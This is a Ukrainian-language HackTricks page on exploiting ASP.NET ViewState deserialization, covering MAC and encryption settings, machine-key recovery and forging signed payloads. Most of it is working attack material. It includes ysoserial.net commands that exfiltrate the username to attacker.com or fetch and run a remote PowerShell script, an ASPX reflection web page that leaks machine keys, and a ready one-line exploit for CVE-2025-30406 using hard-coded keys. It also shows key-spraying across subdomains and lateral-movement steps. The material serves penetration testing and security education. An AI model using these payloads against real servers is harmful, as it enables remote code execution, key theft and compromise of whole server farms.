# Експлуатація \_\_VIEWSTATE без знання секретів

{{#include ../../banners/hacktricks-training.md}}



## Що таке ViewState

**ViewState** слугує механізмом за замовчуванням в ASP.NET для збереження стану сторінки та даних керуючих елементів між запитами. Під час рендерингу HTML сторінки поточний стан сторінки та значення, які потрібно зберегти під час postback, серіалізуються у base64-рядки. Ці рядки потім поміщаються у приховані поля ViewState.

Інформацію ViewState можна охарактеризувати такими властивостями або їх комбінаціями:

- **Base64**:
- Цей формат використовується, коли атрибути `EnableViewStateMac` та `ViewStateEncryptionMode` встановлені в false.
- **Base64 + MAC (Message Authentication Code) Enabled**:
- Увімкнення MAC досягається встановленням атрибута `EnableViewStateMac` в true. Це забезпечує перевірку цілісності даних ViewState.
- **Base64 + Encrypted**:
- Шифрування застосовується, коли атрибут `ViewStateEncryptionMode` встановлений в true, що забезпечує конфіденційність даних ViewState.

## Тестові випадки

Зображення — це таблиця, яка деталізує різні конфігурації ViewState в ASP.NET залежно від версії .NET. Ось короткий виклад змісту:

1. Для **будь-якої версії .NET**, коли як MAC, так і шифрування вимкнені, MachineKey не потрібен, отже немає застосовного методу для його ідентифікації.
2. Для **версій нижче 4.5**, якщо MAC увімкнено, але шифрування — ні, потрібен MachineKey. Метод для ідентифікації MachineKey позначено як "Blacklist3r".
3. Для **версій нижче 4.5**, незалежно від того, чи увімкнено MAC чи вимкнено, якщо шифрування увімкнено, потрібен MachineKey. Ідентифікація MachineKey — це завдання для "Blacklist3r - Future Development".
4. Для **версій 4.5 і вище**, усі комбінації MAC та шифрування (чи обидва true, чи один true а інший false) вимагають MachineKey. MachineKey можна ідентифікувати за допомогою "Blacklist3r".

### Тестовий випадок: 1 – EnableViewStateMac=false and viewStateEncryptionMode=false

Також можливо повністю вимкнути ViewStateMAC, встановивши реєстровий ключ `AspNetEnforceViewStateMac` в нуль у:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Визначення атрибутів ViewState**

Ви можете спробувати визначити, чи захищено ViewState MAC, перехопивши запит, що містить цей параметр, за допомогою BurpSuite. Якщо MAC не використовується для захисту параметра, ви можете експлуатувати його за допомогою [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 – Як Test case 1, але ViewState cookie не надсилається сервером

Розробники можуть **remove ViewState** з HTTP Request (користувач не отримуватиме цей cookie).\
Можна припустити, що якщо **ViewState** **не присутній**, їхня реалізація **безпечна** від будь-яких потенційних вразливостей, що виникають із ViewState deserialization.\
Проте це не так. Якщо ми **add ViewState parameter** до тіла запиту і відправимо наш serialized payload, створений за допомогою ysoserial, ми все одно зможемо досягти **code execution**, як показано в **Case 1**.

### Test Case: 2 – .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false

Щоб **enable ViewState MAC** для **specific page** потрібно внести такі зміни у конкретний aspx файл:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Ми також можемо зробити це для **всього** застосунку, встановивши це у файлі **web.config**, як показано нижче:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Оскільки параметр цього разу захищено MAC, для успішного виконання атаки нам спочатку потрібен ключ, який використовується.

Ви можете спробувати використати [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) щоб знайти ключ, який використовується.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) є ще одним інструментом, який може ідентифікувати відомі machineKeys. Він написаний на Python, тому, на відміну від Blacklist3r, не має залежності від Windows. Для .NET viewstates існує утиліта "python blacklist3r", яка є найшвидшим способом використання.

Йому можна безпосередньо передати viewstate та generator:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Або він може підключитися безпосередньо до цільового URL і спробувати вирізати viewstate з HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Щоб шукати вразливі viewstates у великому масштабі, у поєднанні з subdomain enumeration, можна використовувати модуль `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Якщо вам пощастить і ключ знайдено, ви можете продовжити атаку, використовуючи [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
У випадках, коли параметр `_VIEWSTATEGENERATOR` **не надсилається** сервером, вам **не** потрібно **вказувати** параметр `--generator`, **але ці**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Експлуатація повторно використаних значень `<machineKey>` на великому масштабі

Ink Dragon (2025) показав, наскільки небезпечно, коли адміністратори **копіюють приклади блоків `<machineKey>`, опубліковані в Microsoft docs, StackOverflow answers або vendor blogs**. Після того як хоча б один таргет leaks або повторно використовує ці ключі по всьому farm, будь-яка інша ASP.NET сторінка, яка довіряє ViewState, може бути віддалено захоплена без додаткових вразливостей.

1. **Сформуйте кандидатний wordlist** із leaked `validationKey`/`decryptionKey` пар (наприклад, скрейпінг public repos, Microsoft blog posts або ключі, отримані з одного хоста у farm) і підкажіть його в Blacklist3r/Badsecrets:

```bash
AspDotNetWrapper.exe --keypath reused_machinekeys.txt --url https://target/_layouts/15/ToolPane.aspx --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# or let Badsecrets spray the list
bbot -f subdomain-enum -m badsecrets --badsecrets-keylist reused_machinekeys.txt -t sharepoint.customer.tld
```

Tooling багаторазово підписує benign `__VIEWSTATE` blob кожним кандидатним ключем, поки сервер не прийме MAC, що доводить дійсність ключа.
2. **Сфальсифікуйте шкідливий ViewState**, коли пара ключів відома. Якщо шифрування вимкнене, вам потрібен лише `validationKey`. Якщо шифрування включене, додайте відповідний `decryptionKey`, щоб payload пройшов шлях decrypt → deserialize:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c iwr http://x.x.x.x/a.ps1|iex" \
--validationkey "$VALIDATION" --decryptionkey "$DECRYPTION" --validationalg="SHA1" --generator=<VIEWSTATEGENERATOR>
```

Оператори часто вбудовують дисково-орієнтовані launchers (наприклад PrintNotifyPotato, ShadowPad loaders тощо) прямо в payload, оскільки він виконується як IIS worker (`w3wp.exe`).
3. **Зсувайтесь латерально** шляхом повторного використання того ж `<machineKey>` на суміжних SharePoint/IIS вузлах. Після компрометації одного сервера ви можете повторно використати ключ, щоб вразити кожен інший сервер, який ніколи не оновлював свою конфігурацію.

### Test Case: 3 – .Net < 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true

У цьому випадку невідомо, чи параметр захищений MAC. Тоді значення, ймовірно, зашифроване, і вам **потрібен Machine Key, щоб зашифрувати ваш payload**, щоб експлуатувати вразливість.

**In this case the** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module is under development...**

**Prior to .NET 4.5**, ASP.NET може **приймати** незашифрований \_`__VIEWSTATE`\_ параметр від користувачів **навіть** якщо **`ViewStateEncryptionMode`** встановлено в _**Always**_. ASP.NET **перевіряє лише** **наявність** параметра **`__VIEWSTATEENCRYPTED`** у запиті. **Якщо цей параметр видалити і відправити незашифрований payload, він все одно буде опрацьований.**

Тому якщо нападники знайдуть спосіб добути Machinekey через іншу вразливість, наприклад file traversal, команду з [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net), використану в **Case 2**, можна застосувати для RCE через ViewState deserialization vulnerability.

- Видаліть параметр `__VIEWSTATEENCRYPTED` із запиту, щоб експлуатувати ViewState deserialization vulnerability, інакше повернеться Viewstate MAC validation error і експлойт не вдасться.

### Test Case: 4 – .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false

Ми можемо примусити використання ASP.NET framework, вказавши нижченаведений параметр у файлі web.config, як показано нижче.
```xml
<httpRuntime targetFramework="4.5" />
```
Як альтернативу, це можна зробити, вказавши наведену нижче опцію всередині параметра `machineKey` файлу web.config.
```bash
compatibilityMode="Framework45"
```
Як і в попередньому випадку **значення зашифроване.** Тож, щоб відправити **коректний payload attacker потребує ключа.**

Ви можете спробувати використати [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)to знайти ключ, що використовується:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Для детальнішого опису IISDirPath та TargetPagePath [див. тут](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Або, за допомогою [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (з значенням generator):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Після того, як ідентифіковано дійсний Machine key, **наступним кроком є згенерувати серіалізований payload за допомогою** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Якщо у вас є значення `__VIEWSTATEGENERATOR`, ви можете спробувати **використати** параметр `--generator` з цим значенням і **не вказувати** параметри `--path` та `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

Успішне використання вразливості десеріалізації ViewState призведе до out-of-band запиту на сервер, контрольований атакуючим, який міститиме ім'я користувача. Такий експлойт продемонстровано в proof of concept (PoC), який можна знайти в ресурсі під назвою "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Для докладнішої інформації про процес експлуатації та використання інструментів, таких як Blacklist3r для визначення MachineKey, перегляньте наданий [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Test Case 6 – ViewStateUserKey is being used

The **ViewStateUserKey** property can be used to **defend** against a **CSRF attack**. If such a key has been defined in the application and we try to generate the **ViewState** payload with the methods discussed till now, the **payload won’t be processed by the application**.\
You need to use one more parameter in order to create correctly the payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Результат успішної експлуатації <a href="#poc" id="poc"></a>

Для всіх тестових випадків, якщо ViewState YSoSerial.Net payload спрацьовує **успішно**, сервер відповідає “**500 Internal server error**” з вмістом відповіді “**The state information is invalid for this page and might be corrupted**” і ми отримуємо OOB-запит.

Перегляньте [додаткову інформацію тут](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### Витяг ASP.NET Machine Keys через Reflection (SharPyShell/SharePoint ToolShell)

Атакувачі, які можуть **upload or execute arbitrary ASPX code** всередині кореня веб-застосунку цілі, можуть безпосередньо отримати секретні ключі, що захищають `__VIEWSTATE`, замість їхнього перебору (bruteforcing).
Мінімальний payload, який leaks ключі, використовує внутрішні .NET класи через reflection:
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
Запит цієї сторінки виводить **ValidationKey**, **DecryptionKey**, алгоритм шифрування та режим сумісності ASP.NET. Ці значення можна безпосередньо передати в **ysoserial.net** для створення дійсного, підписаного гаджета `__VIEWSTATE`:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
This **key-exfiltration primitive** was mass-exploited against on-prem SharePoint servers in 2025 ("ToolShell" – CVE-2025-53770/53771), but it is applicable to any ASP.NET application where an attacker can run server-side code.

## 2024-2025 Реальні сценарії експлуатації та Hard-coded Machine Keys

### Microsoft “publicly disclosed machine keys” wave (грудень 2024 – лютий 2025)
Microsoft Threat Intelligence повідомила про масову експлуатацію ASP.NET сайтів, де *machineKey* раніше було leaked на публічних джерелах (GitHub gists, blog posts, paste sites). Зловмисники перелічували ці ключі та згенерували дійсні `__VIEWSTATE` гаджети за допомогою новішої версії `ysoserial.net` 1.41 з прапорами `--minify` та `--islegacy`, щоб обійти обмеження довжини WAF:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
Цілі, які постійно повторно використовують ті самі статичні ключі між фермами, залишаються вразливими нескінченно; коли вони переходять на значення `AutoGenerate`, spray technique припиняється, тому надавайте пріоритет застарілим розгортанням, які все ще відкривають жорстко вбудований матеріал.

### CVE-2025-30406 – Gladinet CentreStack / Triofox hard-coded keys
Kudelski Security виявила, що кілька релізів CentreStack / Triofox поставлялися з однаковими значеннями `machineKey`, що дозволяло неаутентифіковане віддалене виконання коду через підробку ViewState (CVE-2025-30406).

Однорядковий експлоїт:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
Виправлено в CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 — негайно оновіть або замініть ключі.

## Посилання

- [Exploiting ViewState deserialization using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Deep dive into .NET ViewState deserialization and its exploitation](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Exploiting deserialisation in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Introducing badsecrets – fast machineKey discovery](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Code injection attacks abusing publicly disclosed ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)



{{#include ../../banners/hacktricks-training.md}}
